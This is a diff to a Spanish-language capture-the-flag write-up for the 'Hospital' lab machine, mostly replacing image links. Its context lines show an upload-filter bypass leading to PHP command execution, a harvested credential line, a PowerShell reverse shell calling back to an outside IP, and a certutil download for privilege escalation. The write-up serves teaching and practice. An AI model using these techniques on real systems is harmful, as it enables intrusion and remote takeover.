@@ -1,5 +1,6 @@
 # Hospital
 
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/2bb9234d-58e2-46a4-af73-8d9f8296e32b)
 
 
 ***
@@ -108,14 +109,15 @@ Nmap done: 1 IP address (1 host up) scanned in 134.84 seconds
 
 - 8080:
 
-![[Pasted image 20240127132540.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/84c2a4e1-e893-4ae6-a94e-120a6daa064b)
+
 - 443:
 
-![[Pasted image 20240127132612.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/e0bc92f4-ebfd-4f17-8b80-9412716aa062)
 
 - Para el servicio de correo no encontré ninguna vulnerabilidad o algo por el estilo, así que decidí enumerar primero la página hosteada en el puerto 8080, me creé una cuenta con credenciales ``Retr0:123456`` y me encontré con un apartado para subir archivos:
 
-![[Pasted image 20240127132852.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/660d6722-2851-4fe2-8e30-8c96bbc99eab)
 
 - Creé un archivo con el siguiente contenido, para listar las funciones php permitidas en la página:
 
@@ -127,18 +129,18 @@ Nmap done: 1 IP address (1 host up) scanned in 134.84 seconds
 
 - Intenté subir el archivo php pero de primeras la página parecía responderme con errores de subida, así que probé con extensiones distintas a simplemente `php`, como `php4, php5, phtml`. Fue `phpar` la extensión que me permitió subir algo:
 
-![[Pasted image 20240127133310.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/75846e94-0748-4e5f-ae4f-72835ebe1760)
 
 - Ahora bien, el archivo se subió, pero no sabemos a donde.
 - Intenté buscar por algunos nombres de directorio comunes donde se pudiera subir el archivo, probé `uploads` y el recurso existía, pero no tenemos permisos de directory listing para este:
 
-![[Pasted image 20240127133502.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/89c62029-cf16-42eb-abfc-2844d03a48e1)
 
 - Probé poner el nombre del archivo con la esperanza de que no lo encodeara de alguna forma, y en efecto, almacena los archivos con el mismo nombre:
 
-![[Pasted image 20240127133613.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/dca21d43-f46d-438c-8729-5c0813ef2abd)
 
-- Ahora bien, hay bastantes comandos baneados en php, sobre todo los que más nos sirven para ejecutar archivos.
+- Bien, hay bastantes comandos baneados en php, sobre todo los que más nos sirven para ejecutar archivos.
 - Existe uno que podemos emplear y no está en la lista, el cual es `fopen`, que aplicándolo de cierta manera, nos puede ayudar a ejecutar comandos.
 - Me creé un script básico en php que emplea este comando, empleando la creación de un proceso con el cual ejecutaremos nuestra instrucción:
 
@@ -156,7 +158,7 @@ if (is_resource($proc)) {
 ?>
 ~~~
 
-![[Pasted image 20240127134027.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/d579d297-187e-4e8c-b71d-ac769e6a10c7)
 
 - Nos retorna un `www-data`
 - Después de algunas pruebas más, noté que el script no me respondía a comandos de Windows, como `dir`, pero si a sus equivalentes en Linux, por lo que quizá esta es la parte del entorno que emplea un OS distinto.
@@ -247,7 +249,7 @@ drwilliams:qwe123!@#:19612:0:99999:7:::
 - Estas credenciales no parecen ser parte del sistema, así que quizá sean para el servicio de correo.
 - Logramos acceder a la cuenta de `drwilliams`, y vemos que hay un correo bastante interesante:
 
-  ![[Pasted image 20240127140837.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/bb3900a0-9056-43b8-848e-92f068d1ae3b)
 
 - Se nos pide un archivo `PostScript` que posteriormente un Script se encargará de ejecutar.
 - Lo que se me vino a la mente fue buscar algún método para inyectar código dentro del formato de archivo que se nos solicita.
@@ -355,11 +357,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.34 -Port 6666
 - Una vez que tengamos nuestro script, inicaremos un server de Python, al mismo tiempo que nos ponemos en escucha con `netcat`:
 - Una vez que tengamos esto preparado, enviamos el archivo por correo:
 
-![[Pasted image 20240127142719.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/faccbdb7-e4a9-4c24-8c3d-4d255b77f1eb)
 
 - Y si todo fue realizado de manera correcta, deberíamos recibir una conexión casi al instante:
 
-![[Pasted image 20240127142901.png]]
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1629c207-44bc-44b8-86cc-4c4530bf144b)
 
 <h3>PrivEsc:</h3>
 - Bien, probé enumerar distintos servicios que habían en el equipo pero no encontré nada, ni siquiera con herramientas como `mimikatz`.
@@ -433,6 +435,7 @@ CertUtil: -URLCache command completed successfully.
 ~~~
 
  - Ahora solo fue cuestión de dirigirnos a la url que contenía este recurso y acceder como ``Authority System``.
- ![[Pasted image 20240127150539.png]]
+
+![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/857f0a3a-c075-4c25-9af9-6d93cf9e4a03)
 
 - Y así concluimos esta máquina.
